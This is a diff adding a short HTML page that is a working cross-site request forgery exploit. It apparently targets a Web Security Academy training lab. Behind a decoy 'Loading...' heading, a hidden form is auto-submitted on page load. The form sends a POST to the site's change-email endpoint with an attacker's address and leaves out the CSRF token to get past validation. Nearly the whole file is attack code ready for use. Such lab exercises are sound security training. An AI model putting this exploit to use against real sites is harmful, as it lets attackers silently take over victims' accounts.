@@ -1,0 +1,21 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <title>CSRF Attack - Missing Token Bypass</title>
+</head>
+<body>
+    <h1>Loading...</h1>
+    
+    <form id="csrfForm" action="https://0a890012041331b58218de31007b00d8.web-security-academy.net/my-account/change-email" method="POST" style="display:none;">
+        <input type="hidden" name="email" value="attacker@malicious.com">
+        <!-- Note: No CSRF token parameter included to bypass validation -->
+    </form>
+
+    <script>
+        // Automatically submit the form when the page loads
+        document.addEventListener('DOMContentLoaded', function() {
+            document.getElementById('csrfForm').submit();
+        });
+    </script>
+</body>
+</html>
